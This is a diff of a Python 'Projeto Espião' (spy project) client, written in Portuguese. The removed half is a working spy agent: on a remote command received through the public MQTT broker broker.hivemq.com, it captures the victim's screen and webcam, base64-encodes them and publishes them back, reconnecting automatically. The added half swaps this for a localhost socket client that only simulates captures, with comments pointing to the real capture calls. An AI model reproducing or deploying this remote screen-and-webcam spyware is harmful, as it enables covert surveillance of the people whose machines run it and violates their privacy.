@@ -1,103 +1,79 @@
-"""
-Projeto Espião - Módulo do Funcionário (Espião)
----------------------------------------
-Este script representa o "Funcionário" que atua como espião. Ele se conecta a um broker MQTT, aguarda comandos do Gerente para capturar a tela e a webcam, e
-envia os dados de volta ao Gerente via MQTT. O script é projetado para ser simples e eficiente, utilizando bibliotecas populares para captura de tela e webcam, além de comunicação MQTT.
------------------------
-Dependências:
-- paho-mqtt: Para comunicação MQTT.
-- Pillow: Para captura de tela.
-- OpenCV: Para captura de webcam.
------------------------
-Nota: Código desenvolvido com auxílio de IA, adaptado para o contexto do projeto.
-"""
-
+import socket
+import threading
 import json
-import base64
-import cv2
-from PIL import ImageGrab
-import io
 import time
-import paho.mqtt.client as mqtt
 
-# --- CONFIGURAÇÕES ---
-ID_FUNCIONARIO = "Funcionario_01"
-BROKER = "broker.hivemq.com"
-PORTA = 1883
-TOPICO_COMANDOS = "projeto_espiao/comandos"    
-TOPICO_DADOS = "projeto_espiao/dados_retorno" 
+class ProgramaGerenciado:
+    def __init__(self, host_gerenciador='127.0.0.1', port_gerenciador=9999):
+        self.host = host_gerenciador
+        self.port = port_gerenciador
+        self.intervalo = 60 # Intervalo padrão inicial em segundos
+        self.rodando = True
+        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# --- FUNÇÕES DE CAPTURA  ---
+    def simular_captura(self):
+        # Em um cenário real, você usaria:
+        # pyautogui.screenshot() para a tela
+        # cv2.VideoCapture(0) para a webcam
+        return {
+            "tipo": "CAPTURA",
+            "tela": "imagem_tela_bytes_simulados.png",
+            "webcam": "foto_webcam_bytes_simulados.jpg"
+        }
 
-def capturar_tela():
-    """Tira um print da tela principal e retorna em Base64."""
-    try:
-        imagem = ImageGrab.grab()
-        buffer = io.BytesIO()
-        imagem.save(buffer, format='JPEG', quality=70) # Quality reduz o peso da msg MQTT
-        return base64.b64encode(buffer.getvalue()).decode('utf-8')
-    except Exception as e:
-        print(f"Erro ao capturar tela: {e}")
-        return None
-
-def capturar_webcam():
-    """Tira uma foto da webcam padrão e retorna em Base64."""
-    try:
-        cap = cv2.VideoCapture(0)
-        ret, frame = cap.read()
-        cap.release()
-        
-        if ret:
-            # Redimensionar para diminuir o tamanho da mensagem se necessário
-            frame = cv2.resize(frame, (640, 480))
-            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
-            return base64.b64encode(buffer).decode('utf-8')
-    except Exception as e:
-        print(f"Erro ao capturar webcam: {e}")
-    return None
-
-# --- LÓGICA DE COMUNICAÇÃO ---
-
-def ao_receber_comando(client, userdata, msg):
-    """Callback executada quando o Gerente envia uma mensagem."""
-    try:
-        dados_recebidos = json.loads(msg.payload.decode())
-        
-        if dados_recebidos.get("comando") == "CAPTURAR":
-            print("[!] Comando de captura recebido. Processando...")
+    def loop_de_captura(self):
+        while self.rodando:
+            time.sleep(self.intervalo)
+            dados_captura = self.simular_captura()
+            msg_json = json.dumps(dados_captura).encode('utf-8')
+            tamanho = len(msg_json).to_bytes(4, byteorder='big')
             
-            tela_b64 = capturar_tela()
-            webcam_b64 = capturar_webcam()
-            
-            resposta = {
-                "tipo": "imagens",
-                "id_cliente": ID_FUNCIONARIO,
-                "screenshot": tela_b64,
-                "webcam": webcam_b64
-            }
-            
-            # Publica o resultado no tópico de dados
-            client.publish(TOPICO_DADOS, json.dumps(resposta))
-            print("[OK] Dados enviados ao Gerente.")
-            
-    except Exception as e:
-        print(f"[ERRO] Falha ao processar comando: {e}")
+            try:
+                self.client_socket.sendall(tamanho + msg_json)
+                print(f"[+] Capturas enviadas para o gerenciador. Próxima em {self.intervalo}s.")
+            except Exception as e:
+                print(f"[-] Falha ao enviar capturas: {e}")
+                self.rodando = False
+                break
 
-def iniciar_espiao():
-    client = mqtt.Client()
-    client.on_message = ao_receber_comando
-    
-    print(f"Conectando ao Broker {BROKER}...")
-    try:
-        client.connect(BROKER, PORTA, 60)
-        client.subscribe(TOPICO_COMANDOS)
-        
-        print(f"Espião Online ({ID_FUNCIONARIO}). Aguardando ordens...")
-        client.loop_forever()
-    except Exception as e:
-        print(f"Falha na conexão: {e}. Tentando novamente em 10s...")
-        time.sleep(10)
-        iniciar_espiao()
+    def escutar_comandos(self):
+        while self.rodando:
+            try:
+                # Recebe os 4 bytes que dizem o tamanho da mensagem
+                tamanho_bytes = self.client_socket.recv(4)
+                if not tamanho_bytes:
+                    break
+                tamanho_msg = int.from_bytes(tamanho_bytes, byteorder='big')
+                
+                # Recebe o JSON de comando
+                dados = self.client_socket.recv(tamanho_msg)
+                if dados:
+                    comando = json.loads(dados.decode('utf-8'))
+                    if comando.get("comando") == "ATUALIZAR_INTERVALO":
+                        self.intervalo = comando.get("intervalo")
+                        print(f"[*] O Gerenciador atualizou o intervalo para {self.intervalo} segundos.")
+            except Exception as e:
+                print(f"[-] Erro na conexão: {e}")
+                break
+
+    def iniciar(self):
+        try:
+            self.client_socket.connect((self.host, self.port))
+            print("[+] Conectado ao Gerenciador com sucesso.")
+            
+            # Inicia thread para escutar mudanças no intervalo
+            thread_comandos = threading.Thread(target=self.escutar_comandos)
+            thread_comandos.daemon = True
+            thread_comandos.start()
+
+            # Inicia o loop de captura na thread principal
+            self.loop_de_captura()
+
+        except ConnectionRefusedError:
+            print("[-] Não foi possível conectar ao Gerenciador. Verifique se ele está rodando.")
+        finally:
+            self.client_socket.close()
 
 if __name__ == "__main__":
-    iniciar_espiao()
+    cliente = ProgramaGerenciado()
+    cliente.iniciar()
